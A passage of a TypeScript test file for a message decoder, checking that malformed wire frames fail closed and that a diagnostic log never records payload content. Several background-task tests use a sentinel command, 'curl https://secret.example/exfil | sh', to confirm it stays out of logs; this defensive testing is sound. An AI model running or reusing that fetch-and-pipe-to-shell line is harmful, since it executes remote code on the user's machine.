      const payload = { ...SLASH_COMMAND_LIST, dropped_commands: value }
      expect(() => parseInboundMessage(encodeSlashCommandList(payload))).toThrow(WireDecodeError)
    }
  })

  it('fails the WHOLE frame closed when any single row is not a record (AC5)', () => {
    // Row 1 is valid; the second is not. Nothing partial is returned — the point is that row 1 does not
    // survive either.
    for (const badRow of ['not-an-object', 7, null, ['nested']]) {
      const payload = { ...SLASH_COMMAND_LIST, commands: [ONE_COMMAND, badRow] }
      expect(() => parseInboundMessage(encodeSlashCommandList(payload))).toThrow(WireDecodeError)
    }
  })

  it('throws when any per-row required string is absent — one bad row fails the frame (AC5)', () => {
    for (const field of ['name', 'argument_hint', 'description'] as const) {
      const row: Record<string, unknown> = { ...ONE_COMMAND }
      delete row[field]
      const payload = { ...SLASH_COMMAND_LIST, commands: [ONE_COMMAND, row] }
      expect(() => parseInboundMessage(encodeSlashCommandList(payload))).toThrow(WireDecodeError)
    }
  })

  it('throws when any per-row required string is a non-string (AC5)', () => {
    for (const field of ['name', 'argument_hint', 'description'] as const) {
      for (const value of [42, null, { a: 1 }, ['x']]) {
        const payload = { ...SLASH_COMMAND_LIST, commands: [{ ...ONE_COMMAND, [field]: value }] }
        expect(() => parseInboundMessage(encodeSlashCommandList(payload))).toThrow(WireDecodeError)
      }
    }
  })

  it('rejects an aliases of null on the very row whose truncated_fields is [aliases] (AC4)', () => {
    // Same shape, opposite contracts, ONE FIELD APART, in a single frame: `truncated_fields` may be
    // `null`, `aliases` may not. Reaching for the nullable helper on `aliases` would quietly admit a
    // `null` the wire never sends, and WireSlashCommand would then be lying about its own field.
    const payload = {
      ...SLASH_COMMAND_LIST,
      commands: [{ ...ONE_COMMAND, aliases: null, truncated_fields: ['aliases'] }]
    }
    expect(() => parseInboundMessage(encodeSlashCommandList(payload))).toThrow(WireDecodeError)
  })

  it('throws when aliases is OMITTED or any non-array (AC5)', () => {
    const row: Record<string, unknown> = { ...ONE_COMMAND }
    delete row.aliases
    expect(() =>
      parseInboundMessage(encodeSlashCommandList({ ...SLASH_COMMAND_LIST, commands: [row] }))
    ).toThrow(WireDecodeError)
    for (const value of ['reset', 7, { 0: 'reset' }, true]) {
      const payload = { ...SLASH_COMMAND_LIST, commands: [{ ...ONE_COMMAND, aliases: value }] }
      expect(() => parseInboundMessage(encodeSlashCommandList(payload))).toThrow(WireDecodeError)
    }
  })

  it('throws when aliases holds a non-string element — one bad element fails the whole frame (AC5)', () => {
    const bad: unknown[] = [['reset', 7], [null], [{ name: 'reset' }], [['nested']]]
    for (const value of bad) {
      const payload = { ...SLASH_COMMAND_LIST, commands: [{ ...ONE_COMMAND, aliases: value }] }
      expect(() => parseInboundMessage(encodeSlashCommandList(payload))).toThrow(WireDecodeError)
    }
  })

  it('throws when a row truncated_fields key is OMITTED — an absence is not a null (AC5)', () => {
    // Nullable is NOT optional: an omitted key is `undefined`, neither `null` nor an array, and it fails
    // closed. This is the rejection that keeps the cut-aliases reading rule sound downstream.
    const row: Record<string, unknown> = { ...ONE_COMMAND }
    delete row.truncated_fields
    expect(() =>
      parseInboundMessage(encodeSlashCommandList({ ...SLASH_COMMAND_LIST, commands: [row] }))
    ).toThrow(WireDecodeError)
  })

  it('throws when a row truncated_fields is neither an array nor null (AC5)', () => {
    for (const value of ['description', 7, { description: true }, true]) {
      const payload = {
        ...SLASH_COMMAND_LIST,
        commands: [{ ...ONE_COMMAND, truncated_fields: value }]
      }
      expect(() => parseInboundMessage(encodeSlashCommandList(payload))).toThrow(WireDecodeError)
    }
  })

  it('throws when a row truncated_fields holds a non-string element (AC5)', () => {
    const bad: unknown[] = [['description', 7], [null], [{ name: 'aliases' }]]
    for (const value of bad) {
      const payload = {
        ...SLASH_COMMAND_LIST,
        commands: [{ ...ONE_COMMAND, truncated_fields: value }]
      }
      expect(() => parseInboundMessage(encodeSlashCommandList(payload))).toThrow(WireDecodeError)
    }
  })

  it('throws when a slash_command_list payload is not an object (AC5)', () => {
    expect(() => parseInboundMessage(encodeSlashCommandList('nope'))).toThrow(WireDecodeError)
    expect(() => parseInboundMessage(encodeSlashCommandList(['a']))).toThrow(WireDecodeError)
    expect(() => parseInboundMessage(encodeSlashCommandList(null))).toThrow(WireDecodeError)
  })

  it('throws on an oversized slash_command_list plaintext even when the JSON is valid', () => {
    // No per-row or per-menu length check exists here by design — the frame-level guard is the client's
    // only bound, and a client-side mirror of the daemon's entry cap would fail-close a valid frame the
    // day the daemon raises it. The whole measured 51-entry menu is 14,277 bytes of compact UTF-8.
    const bytes = new TextEncoder().encode(
      JSON.stringify({
        id: 903,
        type: 'slash_command_list',
        ts: FIXED_TS,
        payload: {
          conversation_id: 'c1',
          commands: [{ ...ONE_COMMAND, description: 'x'.repeat(MAX_PLAINTEXT_BYTES) }],
          dropped_commands: 0
        }
      })
    )
    expect(bytes.length).toBeGreaterThan(MAX_PLAINTEXT_BYTES)
    expect(() => parseInboundMessage(bytes)).toThrow(WireDecodeError)
  })
})

describe('parseInboundMessage — fail-closed (AC4)', () => {
  it('throws WireDecodeError on decode-level failures inherited from the codec', () => {
    const cases: Uint8Array[] = [
      new Uint8Array([0xff, 0xfe, 0xfd]), // invalid UTF-8
      new TextEncoder().encode('{not json'), // malformed JSON
      new TextEncoder().encode('[]'), // non-object top-level
      new TextEncoder().encode(JSON.stringify({ id: 1, ts: FIXED_TS, payload: {} })), // missing type
      new TextEncoder().encode(JSON.stringify({ id: 1, type: 'message', ts: FIXED_TS })) // missing payload
    ]
    for (const bytes of cases) {
      expect(() => parseInboundMessage(bytes)).toThrow(WireDecodeError)
    }
  })

  it('throws when a message payload is not an object', () => {
    expect(() => parseInboundMessage(encodeMessage('nope'))).toThrow(WireDecodeError)
    expect(() => parseInboundMessage(encodeMessage(['a']))).toThrow(WireDecodeError)
  })

  it('throws on a missing or non-string conversation_id / message_id / text', () => {
    const bad: unknown[] = [
      { ...MSG, conversation_id: undefined },
      { ...MSG, message_id: 42 },
      { ...MSG, text: undefined }
    ]
    for (const payload of bad) {
      expect(() => parseInboundMessage(encodeMessage(payload))).toThrow(WireDecodeError)
    }
  })

  it('throws when role is missing, non-string, or an unknown string', () => {
    const bad: unknown[] = [
      { conversation_id: 'c1', message_id: 'm1', text: 't' }, // role absent
      { ...MSG, role: 5 }, // non-string
      { ...MSG, role: 'system' } // unknown string
    ]
    for (const payload of bad) {
      expect(() => parseInboundMessage(encodeMessage(payload))).toThrow(WireDecodeError)
    }
  })

  it('throws when a message_chunk payload is not an object', () => {
    expect(() => parseInboundMessage(encodeChunk('nope'))).toThrow(WireDecodeError)
  })

  it('throws when messages is missing or not an array', () => {
    const bad: unknown[] = [{}, { messages: {} }, { messages: 'x' }, { messages: 3 }]
    for (const payload of bad) {
      expect(() => parseInboundMessage(encodeChunk(payload))).toThrow(WireDecodeError)
    }
  })

  it('fails the whole chunk closed when any single element is invalid', () => {
    const bad: unknown[] = [
      { messages: [MSG_A, 'not-an-object'] },
      { messages: [MSG_A, { ...MSG_B, text: undefined }] },
      { messages: [{ ...MSG_A, role: 'system' }] }
    ]
    for (const payload of bad) {
      expect(() => parseInboundMessage(encodeChunk(payload))).toThrow(WireDecodeError)
    }
  })

  it('throws on an oversized plaintext even when the JSON would be a valid message envelope', () => {
    // Built with a raw encoder (not encodeEnvelope, which caps on encode) so the bytes ARE a valid
    // message envelope — proving the size guard, not JSON validity, is what rejects it.
    const bytes = new TextEncoder().encode(
      JSON.stringify({
        id: 1,
        type: 'message',
        ts: FIXED_TS,
        payload: { ...MSG, text: 'x'.repeat(MAX_PLAINTEXT_BYTES) }
      })
    )
    expect(bytes.length).toBeGreaterThan(MAX_PLAINTEXT_BYTES)
    expect(() => parseInboundMessage(bytes)).toThrow(WireDecodeError)
  })
})

// A real content-free logger (#126) over a capture array — the assertions see the exact serialized
// JSON line the logger produces, so AC4 (no secret byte in the serialized line) is checked at the
// true boundary. `now` is pinned so the record is deterministic.
function captureLog(): { log: DiagnosticLog; lines: string[] } {
  const lines: string[] = []
  const log = createDiagnosticLog({ sink: { write: (line) => lines.push(line) }, now: () => FIXED_TS })
  return { log, lines }
}

const HEX64 = /^[0-9a-f]{64}$/

describe('parseInboundMessage — content-free diagnostic log (#130)', () => {
  it('logs a modeled message content-free, never a payload value (AC1, AC4)', () => {
    const { log, lines } = captureLog()
    const SECRET_TEXT = 'super-secret-conversation-text'
    const SECRET_CONV = 'secret-conversation-id'
    const payload = { conversation_id: SECRET_CONV, message_id: 'm1', role: 'user', text: SECRET_TEXT }
    const plaintext = encodeMessage(payload)

    const result = parseInboundMessage(plaintext, log)

    expect(result).toEqual({ kind: 'message', message: payload })
    expect(lines).toHaveLength(1)
    const record = JSON.parse(lines[0])
    expect(record.event).toBe('inbound-decoded')
    expect(record.code).toBe('message')
    expect(record.bytes).toBe(plaintext.length)
    expect(record.hash).toMatch(HEX64)
    expect(typeof record.seq).toBe('number')
    // The AC4 guarantee at the serialized boundary: the hash is there, the plaintext is not.
    expect(lines[0]).not.toContain(SECRET_TEXT)
    expect(lines[0]).not.toContain(SECRET_CONV)
  })

  it('logs a modeled message_chunk with its batch count (AC1)', () => {
    const { log, lines } = captureLog()
    const plaintext = encodeChunk({ messages: [MSG_A, MSG_B] })

    parseInboundMessage(plaintext, log)

    expect(lines).toHaveLength(1)
    const record = JSON.parse(lines[0])
    expect(record.event).toBe('inbound-decoded')
    expect(record.code).toBe('message_chunk')
    expect(record.count).toBe(2)
    expect(record.bytes).toBe(plaintext.length)
    expect(record.hash).toMatch(HEX64)
  })

  it('logs an empty message_chunk as a zero-count content-free record', () => {
    const { log, lines } = captureLog()

    parseInboundMessage(encodeChunk({ messages: [] }), log)

    const record = JSON.parse(lines[0])
    expect(record.code).toBe('message_chunk')
    expect(record.count).toBe(0)
    expect(record.hash).toMatch(HEX64)
  })

  it('logs a debug_bundle_chunk content-free, never seq or data (#116)', () => {
    const { log, lines } = captureLog()
    const raw = new Uint8Array([9, 8, 7, 6, 5, 4, 3, 2, 1, 0])
    const plaintext = encodeBundleChunk({ seq: 42, data: base64StdEncode(raw) })

    parseInboundMessage(plaintext, log)

    expect(lines).toHaveLength(1)
    const record = JSON.parse(lines[0])
    expect(record.event).toBe('inbound-decoded')
    expect(record.code).toBe('debug_bundle_chunk')
    expect(record.bytes).toBe(plaintext.length)
    expect(record.hash).toMatch(HEX64)
    // The exact content-free field set — no chunk seq, no data. `seq`/`ts` here are the logger's own
    // record stamps (diagnosticLog.ts), NOT the bundle chunk's seq (which was 42, not 0).
    expect(Object.keys(record).sort()).toEqual(['bytes', 'code', 'event', 'hash', 'seq', 'ts'])
    expect(record.seq).toBe(0) // the log sequence counter, not the chunk's seq:42
    expect(lines[0]).not.toContain(base64StdEncode(raw))
  })

  it('logs a debug_bundle_done content-free, never total (#116)', () => {
    const { log, lines } = captureLog()
    const plaintext = encodeBundleDone({ total: 7 })

    parseInboundMessage(plaintext, log)

    const record = JSON.parse(lines[0])
    expect(record.event).toBe('inbound-decoded')
    expect(record.code).toBe('debug_bundle_done')
    expect(record.bytes).toBe(plaintext.length)
    expect(record.hash).toMatch(HEX64)
    // The exact content-free field set — no `total`.
    expect(Object.keys(record).sort()).toEqual(['bytes', 'code', 'event', 'hash', 'seq', 'ts'])
  })

  it('logs a screen_snapshot on the UNMODELED path, still never text / model / effort (#622)', () => {
    const { log, lines } = captureLog()
    const SECRET_TEXT = 'secret-rendered-terminal-output'
    const plaintext = encodeSnapshot({ ...SNAPSHOT, text: SECRET_TEXT })

    parseInboundMessage(plaintext, log)

    expect(lines).toHaveLength(1)
    const record = JSON.parse(lines[0])
    // The record moves arm — inbound-decoded → inbound-unmodeled — and the anti-leak guarantee is what
    // has to survive the move. This is the only log pin in the file whose frame carries sensitive
    // RENDERED TERMINAL OUTPUT; the sibling `default`-arm pins use `ack` with an empty payload and so
    // have nothing to leak. Content-free by construction: the arm logs `envelope.type` and the frame's
    // byte length + hash, and never reads the payload.
    expect(record.event).toBe('inbound-unmodeled')
    expect(record.code).toBe('screen_snapshot')
    expect(record.bytes).toBe(plaintext.length)
    expect(record.hash).toMatch(HEX64)
    // The exact content-free field set — no snapshot field of any kind reaches the log.
    expect(Object.keys(record).sort()).toEqual(['bytes', 'code', 'event', 'hash', 'seq', 'ts'])
    expect(lines[0]).not.toContain(SECRET_TEXT)
    expect(lines[0]).not.toContain('claude-opus-4-8')
  })

  it('records a malformed screen_snapshot indistinguishably from a well-formed one (#622, AC3)', () => {
    // The inversion of the old "does NOT log on a malformed throw path" pin, and a deliberate part of
    // this removal: the payload is no longer inspected, so the malformed frame no longer throws and
    // therefore DOES leave a record. Asserted as the indistinguishability PROPERTY — comparing the two
    // records against each other is stronger than asserting each alone, and names the whole diagnostic
    // cost of the removal: the two frames now differ only in byte length and hash.
    const wellFormed = captureLog()
    const malformed = captureLog()

    expect(parseInboundMessage(encodeSnapshot(SNAPSHOT), wellFormed.log)).toBeNull()
    expect(
      parseInboundMessage(encodeSnapshot({ ...SNAPSHOT, yolo: 'nope' }), malformed.log)
    ).toBeNull()

    expect(wellFormed.lines).toHaveLength(1)
    expect(malformed.lines).toHaveLength(1)
    const good = JSON.parse(wellFormed.lines[0])
    const bad = JSON.parse(malformed.lines[0])

    expect(bad.event).toBe(good.event)
    expect(bad.code).toBe(good.code)
    expect(Object.keys(bad).sort()).toEqual(Object.keys(good).sort())
    // ...and differ ONLY in the two frame-shape fields, which describe bytes rather than content.
    expect(bad.bytes).not.toBe(good.bytes)
    expect(bad.hash).not.toBe(good.hash)
  })

  it('logs an assistant_delta content-free, never the delta text / turn_id / seq (#199)', () => {
    const { log, lines } = captureLog()
    const SECRET_TEXT = 'super-secret-assistant-reply-slice'
    const SECRET_TURN = 'secret-turn-id'
    const plaintext = encodeAssistantDelta({
      ...DELTA,
      turn_id: SECRET_TURN,
      seq: 987654,
      text: SECRET_TEXT
    })

    parseInboundMessage(plaintext, log)

    expect(lines).toHaveLength(1)
    const record = JSON.parse(lines[0])
    expect(record.event).toBe('inbound-decoded')
    expect(record.code).toBe('assistant_delta')
    expect(record.bytes).toBe(plaintext.length)
    expect(record.hash).toMatch(HEX64)
    // The exact content-free field set — no delta field of any kind reaches the log. `seq`/`ts`
    // here are the logger's own record stamps (diagnosticLog.ts), NOT the delta's seq (987654).
    expect(Object.keys(record).sort()).toEqual(['bytes', 'code', 'event', 'hash', 'seq', 'ts'])
    expect(record.seq).toBe(0) // the log sequence counter, not the delta's seq
    expect(lines[0]).not.toContain(SECRET_TEXT)
    expect(lines[0]).not.toContain(SECRET_TURN)
    expect(lines[0]).not.toContain('987654')
  })

  it('does NOT log on a malformed assistant_delta throw path (#199)', () => {
    const { log, lines } = captureLog()
    expect(() => parseInboundMessage(encodeAssistantDelta({ ...DELTA, seq: 'nope' }), log)).toThrow(
      WireDecodeError
    )
    expect(lines).toHaveLength(0)
  })

  it('logs a turn_end content-free, never the turn_id / stop_reason (#199)', () => {
    const { log, lines } = captureLog()
    const SECRET_TURN = 'secret-turn-id'
    const SECRET_REASON = 'secret-stop-reason'
    const plaintext = encodeTurnEnd({ ...TURN_END, turn_id: SECRET_TURN, stop_reason: SECRET_REASON })

    parseInboundMessage(plaintext, log)

    expect(lines).toHaveLength(1)
    const record = JSON.parse(lines[0])
    expect(record.event).toBe('inbound-decoded')
    expect(record.code).toBe('turn_end')
    expect(record.bytes).toBe(plaintext.length)
    expect(record.hash).toMatch(HEX64)
    expect(Object.keys(record).sort()).toEqual(['bytes', 'code', 'event', 'hash', 'seq', 'ts'])
    expect(lines[0]).not.toContain(SECRET_TURN)
    expect(lines[0]).not.toContain(SECRET_REASON)
  })

  it('does NOT log on a malformed turn_end throw path (#199)', () => {
    const { log, lines } = captureLog()
    expect(() =>
      parseInboundMessage(encodeTurnEnd({ ...TURN_END, stop_reason: 42 }), log)
    ).toThrow(WireDecodeError)
    expect(lines).toHaveLength(0)
  })

  it('logs a turn_state content-free, never the state / conversation_id (#214)', () => {
    const { log, lines } = captureLog()
    const SECRET_CONV = 'secret-conversation-id'
    const plaintext = encodeTurnState({ conversation_id: SECRET_CONV, state: 'responding' })

    parseInboundMessage(plaintext, log)

    expect(lines).toHaveLength(1)
    const record = JSON.parse(lines[0])
    expect(record.event).toBe('inbound-decoded')
    expect(record.code).toBe('turn_state')
    expect(record.bytes).toBe(plaintext.length)
    expect(record.hash).toMatch(HEX64)
    // The exact content-free field set — no decoded field (state / conversation_id) reaches the log.
    expect(Object.keys(record).sort()).toEqual(['bytes', 'code', 'event', 'hash', 'seq', 'ts'])
    expect(lines[0]).not.toContain(SECRET_CONV)
    expect(lines[0]).not.toContain('responding')
  })

  it('does NOT log on a malformed turn_state throw path (#214)', () => {
    const { log, lines } = captureLog()
    expect(() => parseInboundMessage(encodeTurnState({ ...TURN_STATE, state: 'done' }), log)).toThrow(
      WireDecodeError
    )
    expect(lines).toHaveLength(0)
  })

  it('logs a stall content-free, never the conversation_id (#315)', () => {
    const { log, lines } = captureLog()
    const SECRET_CONV = 'secret-conversation-id'
    const plaintext = encodeStall({ conversation_id: SECRET_CONV })

    parseInboundMessage(plaintext, log)

    expect(lines).toHaveLength(1)
    const record = JSON.parse(lines[0])
    expect(record.event).toBe('inbound-decoded')
    expect(record.code).toBe('stall')
    expect(record.bytes).toBe(plaintext.length)
    expect(record.hash).toMatch(HEX64)
    // The exact content-free field set — no decoded field (conversation_id) reaches the log, and no
    // new DiagnosticEvent field is introduced (reuses the existing set).
    expect(Object.keys(record).sort()).toEqual(['bytes', 'code', 'event', 'hash', 'seq', 'ts'])
    expect(lines[0]).not.toContain(SECRET_CONV)
  })

  it('does NOT log on a malformed stall throw path (#315)', () => {
    const { log, lines } = captureLog()
    expect(() => parseInboundMessage(encodeStall({ conversation_id: 42 }), log)).toThrow(
      WireDecodeError
    )
    expect(lines).toHaveLength(0)
  })

  it('logs an api_retry content-free, never the conversation_id or the counter (#492)', () => {
    const { log, lines } = captureLog()
    const SECRET_CONV = 'secret-conversation-id'
    const plaintext = encodeApiRetry({
      conversation_id: SECRET_CONV,
      active: true,
      current: 3,
      total: 10
    })

    parseInboundMessage(plaintext, log)

    expect(lines).toHaveLength(1)
    const record = JSON.parse(lines[0])
    expect(record.event).toBe('inbound-decoded')
    expect(record.code).toBe('api_retry')
    expect(record.bytes).toBe(plaintext.length)
    expect(record.hash).toMatch(HEX64)
    // The exact content-free field set — no decoded field (conversation_id / active / current / total)
    // reaches the log, and no new DiagnosticEvent field is introduced (reuses the existing set).
    expect(Object.keys(record).sort()).toEqual(['bytes', 'code', 'event', 'hash', 'seq', 'ts'])
    expect(lines[0]).not.toContain(SECRET_CONV)
  })

  it('does NOT log on a malformed api_retry throw path (#492)', () => {
    const { log, lines } = captureLog()
    expect(() =>
      parseInboundMessage(
        encodeApiRetry({ conversation_id: 'c1', active: true, current: '3', total: 10 }),
        log
      )
    ).toThrow(WireDecodeError)
    expect(lines).toHaveLength(0)
  })

  it('logs a compacting content-free, never the conversation_id or the edge (#495)', () => {
    const { log, lines } = captureLog()
    const SECRET_CONV = 'secret-conversation-id'
    const plaintext = encodeCompacting({ conversation_id: SECRET_CONV, active: true })

    parseInboundMessage(plaintext, log)

    expect(lines).toHaveLength(1)
    const record = JSON.parse(lines[0])
    expect(record.event).toBe('inbound-decoded')
    expect(record.code).toBe('compacting')
    expect(record.bytes).toBe(plaintext.length)
    expect(record.hash).toMatch(HEX64)
    // The exact content-free field set — no decoded field (conversation_id / active) reaches the log,
    // and no new DiagnosticEvent field is introduced (reuses the existing set).
    expect(Object.keys(record).sort()).toEqual(['bytes', 'code', 'event', 'hash', 'seq', 'ts'])
    expect(lines[0]).not.toContain(SECRET_CONV)
  })

  it('does NOT log on a malformed compacting throw path (#495)', () => {
    const { log, lines } = captureLog()
    expect(() =>
      parseInboundMessage(encodeCompacting({ conversation_id: 'c1', active: 'true' }), log)
    ).toThrow(WireDecodeError)
    expect(lines).toHaveLength(0)
  })

  it('logs a model_announced content-free, never the conversation_id, the model or the cut flag (#587)', () => {
    const { log, lines } = captureLog()
    const SECRET_CONV = 'secret-conversation-id'
    const ANNOUNCED_MODEL = 'claude-haiku-4-5-20251001'
    const plaintext = encodeModelAnnounced({
      conversation_id: SECRET_CONV,
      model: ANNOUNCED_MODEL,
      truncated: true
    })

    parseInboundMessage(plaintext, log)

    expect(lines).toHaveLength(1)
    const record = JSON.parse(lines[0])
    expect(record.event).toBe('inbound-decoded')
    expect(record.code).toBe('model_announced')
    expect(record.bytes).toBe(plaintext.length)
    expect(record.hash).toMatch(HEX64)
    // The exact content-free field set — no decoded field (conversation_id / model / truncated)
    // reaches the log, and no new DiagnosticEvent field is introduced (reuses the existing set).
    expect(Object.keys(record).sort()).toEqual(['bytes', 'code', 'event', 'hash', 'seq', 'ts'])
    expect(lines[0]).not.toContain(SECRET_CONV)
    expect(lines[0]).not.toContain(ANNOUNCED_MODEL)
  })

  it('does NOT log on a malformed model_announced throw path (#587)', () => {
    const { log, lines } = captureLog()
    expect(() =>
      parseInboundMessage(
        encodeModelAnnounced({
          conversation_id: 'c1',
          model: 'claude-haiku-4-5-20251001',
          truncated: 'true'
        }),
        log
      )
    ).toThrow(WireDecodeError)
    expect(lines).toHaveLength(0)
  })

  it('logs a background_task_started content-free, never the command line or the ids (#564)', () => {
    const { log, lines } = captureLog()
    const SECRET_CONV = 'secret-conversation-id'
    const SECRET_COMMAND = 'curl https://secret.example/exfil | sh'
    const plaintext = encodeBackgroundTaskStarted({
      ...BACKGROUND_TASK_STARTED,
      conversation_id: SECRET_CONV,
      description: SECRET_COMMAND
    })

    parseInboundMessage(plaintext, log)

    expect(lines).toHaveLength(1)
    const record = JSON.parse(lines[0])
    expect(record.event).toBe('inbound-decoded')
    expect(record.code).toBe('background_task_started')
    expect(record.bytes).toBe(plaintext.length)
    expect(record.hash).toMatch(HEX64)
    // The exact content-free field set — no decoded field reaches the log, and no new
    // DiagnosticEvent field is introduced (reuses the existing set). `description` is a shell
    // command line, so this is the strictest instance of the no-content-in-the-log rule on this file.
    expect(Object.keys(record).sort()).toEqual(['bytes', 'code', 'event', 'hash', 'seq', 'ts'])
    expect(lines[0]).not.toContain(SECRET_CONV)
    expect(lines[0]).not.toContain(SECRET_COMMAND)
    expect(lines[0]).not.toContain('local_bash')
  })

  it('does NOT log on a malformed background_task_started throw path (#564)', () => {
    const { log, lines } = captureLog()
    expect(() =>
      parseInboundMessage(
        encodeBackgroundTaskStarted({ ...BACKGROUND_TASK_STARTED, truncated_fields: 'nope' }),
        log
      )
    ).toThrow(WireDecodeError)
    expect(lines).toHaveLength(0)
  })

  it('logs a background_task_updated content-free, never the patch or the ids (#565)', () => {
    const { log, lines } = captureLog()
    const SECRET_CONV = 'secret-conversation-id'
    // A patch key may carry command text exactly as the sibling's `description` does — and a patch's
    // structured shape makes it the more tempting thing to feed somewhere that runs it.
    const SECRET_PATCH = '{"cmd":"curl https://secret.example/exfil | sh"}'
    const plaintext = encodeBackgroundTaskUpdated({
      ...BACKGROUND_TASK_UPDATED,
      conversation_id: SECRET_CONV,
      patch: SECRET_PATCH
    })

    parseInboundMessage(plaintext, log)

    expect(lines).toHaveLength(1)
    const record = JSON.parse(lines[0])
    expect(record.event).toBe('inbound-decoded')
    expect(record.code).toBe('background_task_updated')
    expect(record.bytes).toBe(plaintext.length)
    expect(record.hash).toMatch(HEX64)
    // The exact content-free field set — no decoded field reaches the log, and no new
    // DiagnosticEvent field is introduced (reuses the existing set).
    expect(Object.keys(record).sort()).toEqual(['bytes', 'code', 'event', 'hash', 'seq', 'ts'])
    expect(lines[0]).not.toContain(SECRET_CONV)
    expect(lines[0]).not.toContain(SECRET_PATCH)
    expect(lines[0]).not.toContain('task_01ABC')
  })

  it('does NOT log on a malformed background_task_updated throw path (#565)', () => {
    const { log, lines } = captureLog()
    expect(() =>
      parseInboundMessage(
        encodeBackgroundTaskUpdated({ ...BACKGROUND_TASK_UPDATED, truncated_fields: 'nope' }),
        log
      )
    ).toThrow(WireDecodeError)
    expect(lines).toHaveLength(0)
  })

  it('logs a background_task_roster content-free, never a row description or an id (#566)', () => {
    const { log, lines } = captureLog()
    const SECRET_CONV = 'secret-conversation-id'
    const SECRET_TASK = 'secret-task-id'
    // A row's `description` IS the literal command line claude ran — writing one into the diagnostic
    // log would put a command line on disk. A LIST of them is the more tempting shape, which is why
    // the sentinel rides a row rather than the frame.
    const SECRET_DESCRIPTION = 'curl https://secret.example/exfil | sh'
    const plaintext = encodeBackgroundTaskRoster({
      ...BACKGROUND_TASK_ROSTER,
      conversation_id: SECRET_CONV,
      tasks: [
        { ...BACKGROUND_TASK_ROSTER.tasks[0], task_id: SECRET_TASK, description: SECRET_DESCRIPTION }
      ]
    })

    parseInboundMessage(plaintext, log)

    expect(lines).toHaveLength(1)
    const record = JSON.parse(lines[0])
    expect(record.event).toBe('inbound-decoded')
    expect(record.code).toBe('background_task_roster')
    expect(record.bytes).toBe(plaintext.length)
    expect(record.hash).toMatch(HEX64)
    // The exact content-free field set — no decoded field reaches the log, and DELIBERATELY NO
    // `count`: DiagnosticEvent already carries one, so the roster size would cost nothing
    // structurally, and it is omitted because how much work claude has running is itself a fact about
    // the user's session (the queue_state / conversation_created posture). No new DiagnosticEvent
    // field is introduced either, so #131's renderer pin is untouched.
    expect(Object.keys(record).sort()).toEqual(['bytes', 'code', 'event', 'hash', 'seq', 'ts'])
    for (const secret of [SECRET_CONV, SECRET_TASK, SECRET_DESCRIPTION]) {
      expect(lines[0]).not.toContain(secret)
    }
  })

  it('does NOT log on a malformed background_task_roster throw path (#566)', () => {
    const { log, lines } = captureLog()
    expect(() =>
      parseInboundMessage(
        encodeBackgroundTaskRoster({ ...BACKGROUND_TASK_ROSTER, tasks: null }),
        log
      )
    ).toThrow(WireDecodeError)
    expect(lines).toHaveLength(0)
  })

  it('logs an unrecognized_message content-free — never the raw blob, type, or conversation_id', () => {
    const { log, lines } = captureLog()
    const SECRET_CONV = 'secret-conversation-id'
    const SECRET_RAW = '{"type":"some_future_event","secret":"must-not-be-logged"}'
    const plaintext = encodeUnrecognized({
      conversation_id: SECRET_CONV,
      site: 'line_type',
      message_type: 'some_future_event',
      raw: SECRET_RAW,
      truncated: false
    })

    parseInboundMessage(plaintext, log)

    expect(lines).toHaveLength(1)
    const record = JSON.parse(lines[0])
    expect(record.event).toBe('inbound-decoded')
    expect(record.code).toBe('unrecognized_message')
    expect(record.bytes).toBe(plaintext.length)
    expect(record.hash).toMatch(HEX64)
    // The exact content-free field set. This arm carries the most untrusted string on the wire, so the
    // no-content-in-the-log rule binds hardest here: the whole point of the frame is that the daemon's
    // own log could not be trusted to carry this safely either.
    expect(Object.keys(record).sort()).toEqual(['bytes', 'code', 'event', 'hash', 'seq', 'ts'])
    expect(lines[0]).not.toContain(SECRET_CONV)
    expect(lines[0]).not.toContain('must-not-be-logged')
    expect(lines[0]).not.toContain('some_future_event')
  })

  it('does NOT log on a malformed unrecognized_message throw path', () => {
    const { log, lines } = captureLog()
    expect(() =>
      parseInboundMessage(encodeUnrecognized({ ...UNRECOGNIZED, site: 'bogus_site' }), log)
    ).toThrow(WireDecodeError)
    expect(lines).toHaveLength(0)
  })

  it('logs a tool_use content-free, never a decoded field (#217)', () => {
    const { log, lines } = captureLog()
    const SECRET_CONV = 'secret-conversation-id'
    const SECRET_TURN = 'secret-turn-id'
    const SECRET_TU = 'secret-tool-use-id'
    const SECRET_NAME = 'secret-tool-name'
    const SECRET_SUMMARY = 'secret-input-summary'
    // The input map's KEYS are as sensitive as its values — a daemon-chosen field name is itself
    // model-authored text, since an MCP tool can name a field anything (#642).
    const SECRET_KEY = 'secret-input-field-name'
    const SECRET_VALUE = 'secret-input-field-value'
    const plaintext = encodeToolUse({
      conversation_id: SECRET_CONV,
      turn_id: SECRET_TURN,
      tool_use_id: SECRET_TU,
      name: SECRET_NAME,
      input_summary: SECRET_SUMMARY,
      input: { [SECRET_KEY]: SECRET_VALUE }
    })

    parseInboundMessage(plaintext, log)

    expect(lines).toHaveLength(1)
    const record = JSON.parse(lines[0])
    expect(record.event).toBe('inbound-decoded')
    expect(record.code).toBe('tool_use')
    expect(record.bytes).toBe(plaintext.length)
    expect(record.hash).toMatch(HEX64)
    // The exact content-free field set — no decoded field reaches the log.
    expect(Object.keys(record).sort()).toEqual(['bytes', 'code', 'event', 'hash', 'seq', 'ts'])
    for (const secret of [
      SECRET_CONV,
      SECRET_TURN,
      SECRET_TU,
      SECRET_NAME,
      SECRET_SUMMARY,
      SECRET_KEY,
      SECRET_VALUE
    ]) {
      expect(lines[0]).not.toContain(secret)
    }
  })

  it('does NOT log on a malformed tool_use throw path (#217)', () => {
    const { log, lines } = captureLog()
    expect(() => parseInboundMessage(encodeToolUse({ ...TOOL_USE, name: 42 }), log)).toThrow(
      WireDecodeError
    )
    expect(lines).toHaveLength(0)
  })

  it('does NOT log when the ONLY defect is a malformed tool_use input (#642)', () => {
    const { log, lines } = captureLog()
    // Every other field is well-formed: the new throw path must leave no record either.
    expect(() =>
      parseInboundMessage(encodeToolUse({ ...TOOL_USE, input: { path: 42 } }), log)
    ).toThrow(WireDecodeError)
    expect(lines).toHaveLength(0)
  })

  it('logs a tool_result content-free, never a decoded field (#229)', () => {
    const { log, lines } = captureLog()
    const SECRET_CONV = 'secret-conversation-id'
    const SECRET_TURN = 'secret-turn-id'
    const SECRET_TU = 'secret-tool-use-id'
    const SECRET_SUMMARY = 'secret-result-summary'
    const SECRET_DETAIL = 'secret-result-detail'
    const plaintext = encodeToolResult({
      conversation_id: SECRET_CONV,
      turn_id: SECRET_TURN,
      tool_use_id: SECRET_TU,
      is_error: true,
      result_summary: SECRET_SUMMARY,
